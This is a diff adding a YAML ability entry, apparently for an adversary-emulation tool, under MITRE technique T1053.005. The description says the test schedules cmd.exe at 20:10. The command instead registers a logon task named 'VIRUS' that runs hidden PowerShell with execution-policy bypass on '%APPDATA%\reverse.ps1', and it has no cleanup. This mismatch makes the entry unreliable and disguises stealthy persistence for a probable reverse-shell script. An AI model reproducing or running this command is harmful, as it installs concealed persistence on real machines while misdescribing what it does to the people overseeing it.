@@ -1,0 +1,48 @@
+                                                                                             
+- tactic: multiple
+  technique_name: 'Scheduled Task/Job: Scheduled Task'
+  technique_id: T1053.005
+  name: Powershell Cmdlet Scheduled Task
+  description: 'Create an atomic scheduled task that leverages native powershell cmdlets.
+
+
+    Upon successful execution, powershell.exe will create a scheduled task to spawn
+    cmd.exe at 20:10.
+
+    '
+  executors:
+  - name: psh
+    platform: windows
+    command: '$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument
+      "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:APPDATA\reverse.ps1`""
+
+      $trigger = New-ScheduledTaskTrigger -AtLogOn
+
+      Register-ScheduledTask -TaskName "VIRUS" -Action $action -Trigger $trigger'
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers:
+    - module: plugins.atomic.app.parsers.atomic_powershell
+      parserconfigs:
+      - source: validate_me
+        edge: ''
+        target: ''
+        custom_parser_vals: {}
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - multiple
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: atomic
+  delete_payload: true
+  id: ba8ddc38c7c6ced12fecc0d695c5e57c
